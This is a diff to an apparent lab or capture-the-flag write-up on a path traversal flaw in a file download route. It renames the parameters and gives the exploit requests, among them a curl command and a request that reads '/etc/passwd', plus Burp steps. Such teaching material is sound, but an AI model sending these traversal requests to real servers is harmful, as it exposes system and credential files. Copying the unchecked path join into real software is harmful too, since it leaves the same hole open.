@@ -4,36 +4,36 @@
 
 ## The vulnerability
 
-`app/main.py` builds the file path like this:
+`app/routes.py` builds the file path like this:
 
 ```python
-target_path = os.path.join(STORAGE_DIR, doc)   # doc comes from the user
+target_path = os.path.join(DOCUMENTS_DIR, file)   # file comes from the user
 ...
 return send_file(target_path, as_attachment=False)
 ```
 
 `os.path.join` resolves `..` components, and the code never checks that the
-final path stays inside `STORAGE_DIR`. That is a textbook path traversal
-(CWE-22): the `doc` parameter can walk *up* out of the intended directory.
+final path stays inside `DOCUMENTS_DIR`. That is a textbook path traversal
+(CWE-22): the `file` parameter can walk *up* out of the intended directory.
 
 ## Exploitation
 
 Normal, intended request:
 
 ```
-GET /documents/download?doc=welcome.txt
+GET /docs/download?file=welcome.txt
 ```
 
-Escape the `storage/` directory to read the flag one level up:
+Escape the `docs/` directory to read the flag one level up:
 
 ```
-GET /documents/download?doc=../flag.txt
+GET /docs/download?file=../flag.txt
 ```
 
 With `curl`:
 
 ```bash
-curl --path-as-is "http://localhost:5000/documents/download?doc=../flag.txt"
+curl --path-as-is "http://localhost:5000/docs/download?file=../flag.txt"
 ```
 
 > `--path-as-is` stops curl from normalizing `../` before sending.
@@ -50,7 +50,7 @@ Because there is no filtering at all, you can keep walking up and read files
 from the container filesystem, e.g.:
 
 ```
-GET /documents/download?doc=../../../../etc/passwd
+GET /docs/download?file=../../../../etc/passwd
 ```
 
 (Inside the hardened container this reads the container's own `/etc/passwd`,
@@ -61,7 +61,7 @@ not your host's — which is the point of running labs in Docker.)
 1. Proxy your browser through Burp and load <http://localhost:5000>.
 2. Click **Download** on any document — capture the request in **Proxy > HTTP history**.
 3. Send it to **Repeater**.
-4. Change the `doc` parameter to `../flag.txt` and send.
+4. Change the `file` parameter to `../flag.txt` and send.
 5. Observe the flag in the response.
 
 Try fuzzing the parameter with **Intruder** using a path-traversal wordlist
